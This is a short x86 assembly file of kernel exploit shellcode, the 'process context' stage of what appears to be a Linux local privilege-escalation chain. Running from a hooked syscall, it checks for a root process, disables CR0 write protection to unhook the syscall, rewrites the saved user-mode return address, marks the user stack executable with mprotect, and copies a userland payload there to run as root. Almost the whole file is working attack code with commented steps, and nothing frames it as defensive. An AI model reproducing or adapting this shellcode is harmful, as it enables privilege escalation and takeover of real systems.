# Process context shellcode
.intel_syntax noprefix
.globl process_start
.globl process_end

.set USER_LEN,0x280

.macro disable_wp
        mov eax,cr0
        and eax,0xfffeffff
        mov cr0,eax
.endm

.macro enable_wp
        mov eax,cr0
        or eax,0x10000
        mov cr0,eax
.endm

.text
process_start:
	sub esp,0x40
	call geteip2
geteip2:
	pop esi
	
	# We stashed the saved values and location just below the page
	# boundary of the softirq stack.
	and si,0xff00

	# Call getuid and continue if we're not root.
	mov eax,0x18
	int 0x80
	test eax,eax
	jnz return

	# Retrieve the original syscall address and value
	mov ecx,DWORD PTR [esi-0x4]
	mov ebx,DWORD PTR [esi-0x8]

	# First, unhook the syscall. This is more dangerous, because we're in
	# process context now, but danger is my middle name.
	disable_wp
	mov DWORD PTR [ebx],ecx
	enable_wp
	
	# Set the userland saved EIP to its saved ESP, where we'll put our
	# payload.
	#
	# Stack frame always looks like:
	#	%ss (0x7b)
	#	%esp
	#	%eflags
	#	%cs (0x73)
	#	%eip
	#	
	mov eax,esp
find_fs:
	add eax,4
	cmp BYTE PTR [eax+4],0x73
	jne find_fs
	cmp BYTE PTR [eax+16],0x7b
	jne find_fs

	mov ebx,DWORD PTR [eax]
	mov edi,DWORD PTR [eax+12]
	and di,0xf000
	sub edi,0x1000
	mov DWORD PTR [eax],edi

	# Keep the original userland EIP stashed on the userland stack so our
	# userland shellcode can keep the process running.
	mov DWORD PTR [edi-0x4],ebx

	# Call mprotect to mark the userland stack executable.
	mov eax,0x7d
	mov ebx,edi
	mov ecx,0x2
	mov edx,0x7
	int 0x80

	# Copy our userland payload onto the userland stack and return.
	call geteip3
geteip3:
	pop esi
	add esi,0x400
	and si,0xf000
	sub esi,0x800
	
	mov ecx,USER_LEN
	cld
	rep movsb

	and si,0xf000
	add esi,0xc00
return:
	add esp,0x40
	mov eax,DWORD PTR [esi-0x4]
	jmp eax
	
process_end:
